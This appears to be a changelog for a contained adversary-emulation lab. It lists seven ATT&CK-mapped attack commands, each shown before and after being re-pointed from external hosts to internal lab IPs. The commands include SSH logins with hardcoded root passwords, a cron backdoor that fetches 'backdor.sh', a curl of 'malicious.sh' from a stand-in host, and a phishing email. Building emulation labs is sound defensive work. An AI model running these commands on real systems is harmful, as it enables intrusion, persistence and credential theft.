# Containment Changes — Curated Case Command Adaptations

## Why these changes exist

The adversary emulation lab must run **fully contained**: no emulated command may
reach the host machine or the public internet. The `docker/docker-compose.yml`
topology is hardened so every service sits on internal-only networks
(`internal: true`) — `caldera` (172.20.0.10), `kali` (172.20.0.20 / 172.21.0.10),
`nginx` web target (172.21.0.20 / 172.22.0.10), and `db` backend (172.22.0.20)
across the `172.20.0.0/24`, `172.21.0.0/24`, and `172.22.0.0/24` subnets.

Seven curated-case commands still referenced **external destinations** (public
domains, `localhost`, `example.com`, an internet download, and external email
recipients). Those destinations are unreachable in the hardened topology and would
break end-to-end execution, so each command was re-pointed at an internal lab host
while **preserving the ATT&CK technique and intent**. The `nginx` host
(172.21.0.20) serves as the primary web target and `db` (172.22.0.20) as the
backend / internal mail host.

With these edits, all 8 curated cases are fully contained. Note that the
`ContainmentValidator` enforces this at runtime regardless — these source edits
simply ensure the campaigns pass validation and run end-to-end without touching
the host or the internet.

---

## Before / After

### 1. C0010 — Domains
- **Case slug:** `c0010`
- **Ability ID:** `543281ce-dbb9-548d-9a1b-d124eb25c0fe`
- **Technique:** T1584.001 — Domains
- **Original command:**
  ```
  sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'curl -s --resolve oldsub.legitshipping.co.il:80:172.22.0.20 http://oldsub.legitshipping.co.il/; nc -vz 172.21.0.20 53; dig @172.21.0.20 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/'
  ```
- **Adapted command:**
  ```
  sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/; nc -vz 172.21.0.20 53; dig @172.21.0.20 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/'
  ```
- **Rationale:** external destination `http://oldsub.legitshipping.co.il/` → internal lab host `172.22.0.20` (via impersonated `Host` header); ATT&CK technique preserved (legacy-domain / vhost impersonation is still modeled through the Host header).

### 2. CostaRicto — Scheduled Task
- **Case slug:** `costaricto`
- **Ability ID:** `708775d0-507e-5b5c-b811-04ccf20f3685`
- **Technique:** T1053.005 — Scheduled Task
- **Original command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
  ```
- **Adapted command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://172.21.0.20/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
  ```
- **Rationale:** external destination `http://localhost/backdor.sh` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (scheduled task fetching a payload).

### 3. Operation MidnightEclipse — Cron
- **Case slug:** `operation_midnighteclipse`
- **Ability ID:** `819b5cfe-2794-50b7-8d67-a1a8608a9de8`
- **Technique:** T1053.003 — Cron
- **Original command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://localhost/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
  ```
- **Adapted command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "wget http://172.21.0.20/backdor.sh" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "* * * * * root /root/backdoor_task.sh" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'
  ```
- **Rationale:** external destination `http://localhost/backdor.sh` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (cron job retrieving a payload).

### 4. Operation MidnightEclipse — Unix Shell
- **Case slug:** `operation_midnighteclipse`
- **Ability ID:** `34b6e6ad-685e-5c73-838f-048d43b49f21`
- **Technique:** T1059.004 — Unix Shell
- **Original command:**
  ```
  sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://example.com/malicious.sh | cat'
  ```
- **Adapted command:**
  ```
  sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://172.21.0.20/malicious.sh | cat'
  ```
- **Rationale:** external destination `http://example.com/malicious.sh` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (download and run a shell script).

### 5. Salesforce Data Exfiltration — Email Accounts
- **Case slug:** `salesforce_data_exfiltration`
- **Ability ID:** `ee7a720f-a8d4-5ee0-9565-efa047f87a15`
- **Technique:** T1585.002 — Email Accounts
- **Original command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Test email from attacker" | mail -s "Test Subject" shinycorp@tuta.com'
  ```
- **Adapted command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Test email from attacker" | mail -s "Test Subject" shinycorp@172.22.0.20'
  ```
- **Rationale:** external destination `shinycorp@tuta.com` → internal lab mail host `172.22.0.20`; ATT&CK technique preserved (attacker-controlled email account, now internal).

### 6. Salesforce Data Exfiltration — Impersonation
- **Case slug:** `salesforce_data_exfiltration`
- **Ability ID:** `8660e027-d92c-5cb3-96d9-dc40a3d28852`
- **Technique:** T1656 — Impersonation
- **Original command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Click here and give me your password" | mail -s "Password Expired" victim@labcdcfake.com'
  ```
- **Adapted command:**
  ```
  sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo "Click here and give me your password" | mail -s "Password Expired" victim@172.22.0.20'
  ```
- **Rationale:** external destination `victim@labcdcfake.com` → internal lab mail host `172.22.0.20`; ATT&CK technique preserved (impersonation phishing email, now internal).

### 7. ShadowRay — Exploitation for Privilege Escalation
- **Case slug:** `shadowray`
- **Ability ID:** `8130dba3-f51c-57d2-9d49-78e9b0bb3c4b`
- **Technique:** T1068 — Exploitation for Privilege Escalation
- **Original command:**
  ```
  sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 wget https://nmap.org/dist/nmap-7.98.tgz
  ```
- **Adapted command:**
  ```
  sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 wget http://172.21.0.20/dist/nmap-7.98.tgz
  ```
- **Rationale:** external destination `https://nmap.org/dist/nmap-7.98.tgz` → internal lab web target `172.21.0.20`; ATT&CK technique preserved (ingress tool transfer for privilege escalation).
